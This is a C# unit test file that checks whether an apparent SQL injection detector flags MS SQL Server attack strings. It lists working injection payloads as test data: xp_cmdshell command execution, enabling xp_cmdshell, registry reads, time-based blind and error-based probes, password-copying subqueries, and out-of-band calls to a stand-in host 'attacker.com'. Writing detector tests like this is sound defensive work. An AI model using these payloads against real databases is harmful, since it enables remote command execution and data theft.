using FluentAssertions;
using SqlInjectDetect;

namespace SqlInjectDetectTests;

[TestClass]
public sealed class SqlInjectDetectorMsSqlServerTests
{
    [TestMethod]
    public void ContainsSqlInjection_MsSqlServerSpecific_ReturnsTrue()
    {
        // Arrange
        var msSqlInjections = new[]
        {
            // More xp_cmdshell variations
            "'; EXEC xp_cmdshell 'ping attacker.com'; --",
            "'; EXEC master.dbo.xp_cmdshell 'net user'; --",

            // sp_configure to enable advanced options
            "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --",
            "'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --",

            // BULK INSERT from a file
            "'; BULK INSERT users FROM 'c:\\temp\\users.txt' WITH (FIELDTERMINATOR = ','); --",

            // More WAITFOR DELAY for time-based attacks
            "'; IF (SELECT COUNT(*) FROM users) > 10 WAITFOR DELAY '00:00:05'; --",

            // System tables and views
            "'; SELECT name FROM sysobjects WHERE xtype = 'U'; --",
            "'; SELECT name FROM master..sysdatabases; --",

            // Stacking queries
            "'; SELECT * FROM users; SELECT * FROM products; --",

            // Error-based injections
            "'; SELECT 1/0; --",
            "'; SELECT CAST(@@version AS int); --",

            // Out-of-band attacks
            "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'; --",
            
            // OPENROWSET for unauthorized data access
            "SELECT * FROM OPENROWSET('SQLNCLI', 'Server=server;UID=user;PWD=pass', 'SELECT * FROM users')",
            
            // OPENQUERY for linked server attacks
            "SELECT * FROM OPENQUERY(LINKED_SERVER, 'SELECT * FROM users')",
            
            // DBCC commands
            "' OR 1=1; DBCC CHECKDB; --",
            
            // xp_regread for reading registry
            "'; EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'; --",
            
            // sp_addlinkedserver to create a linked server
            "'; EXEC sp_addlinkedserver 'new_server', 'SQL Server'; --",
            
            // Time-based blind injection
            "';WAITFOR DELAY '0:0:10'--",
            
            // Error-based injection
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            
            // Blind injection with conditional delay
            "IF (ASCII(SUBSTRING((SELECT top 1 name FROM sys.tables), 1, 1))) > 100 WAITFOR DELAY '0:0:5'",
            
            // INSERT with subquery
            "INSERT INTO users (username, password) VALUES ('admin', (SELECT TOP 1 password FROM admin_users));",
            
            // UPDATE with subquery
            "UPDATE users SET password = (SELECT TOP 1 password FROM admin_users) WHERE username = 'admin';",
            
            // More xp_cmdshell
            "EXEC master.dbo.xp_cmdshell 'dir'"
        };

        // Act & Assert
        foreach (var input in msSqlInjections)
        {
            SqlInjectDetector.ContainsSqlInjection(input).Should().BeTrue($"MS SQL Server specific injection '{input}' should be detected");
        }
    }
}
